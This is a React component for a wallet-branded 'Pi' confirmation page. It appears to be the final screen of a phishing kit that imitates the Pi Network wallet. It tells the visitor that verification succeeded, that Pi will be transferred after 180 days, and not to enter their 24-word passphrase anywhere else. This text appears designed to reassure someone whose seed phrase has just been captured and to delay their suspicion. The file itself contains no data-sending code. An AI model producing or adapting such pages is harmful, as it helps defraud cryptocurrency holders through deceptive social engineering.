import React from 'react'
import { IoIosArrowBack, IoIosArrowDown } from 'react-icons/io'
import logo from '../assets/logo.png'
import wallet from '../assets/wallet.png'

const LastPage = () => {
  return (
    <div className='min-h-screen bg-white  max-w-md mx-auto text-center' >
              <nav className="w-full bg-[#783A8D] text-white flex items-center justify-between px-4 py-3 text-lg font-medium">
                <span className="text-2xl"><h1 className="font-black text-[21px]"><a href="/"><IoIosArrowBack size={25} style={{
                
                        strokeWidth: "70"
                }} /></a></h1></span>
                  <h1 className='font-bold flex items-center jusity-center gap-2 text-[21px]' > <img src={wallet} alt="" className='w-[1.3em]'/> Wallet <img src={logo} alt="" className='w-[1.3em]'/></h1>
                <span className="text-2xl"><h1 className="font-black text-[21px]"><IoIosArrowDown size={25} style={{
                
                        strokeWidth: "70"
                }} /></h1></span>
              </nav>

              <div className='p-2'>
                  <h1 className="text-lg font-semibold mt-5">Verification successful.</h1>
                  <h1 className="text-lg font-semibold mt-5">Pi will be automatically transferred after 180<br />days.</h1>
                  <h1 className="text-lg font-semibold mt-5">Make sure you do not enter your 24 word password anywhere else so that your reward is not lost after receiving it.</h1>
      <p  className='text-start  text-[12px] mt-8  ' >As a non-custodial wallet, your passphrase is only accessible to you. <br /> Password recovery is currently not possible</p>
      <p  className=' text-start  text-[12px] mt-5' >Lost your password example? <span className=' text-blue-400'>You can create a new wallet,</span> but all the π in your previous wallet will be inaccessible.</p>

              </div>
    </div>
  )
}

export default LastPage
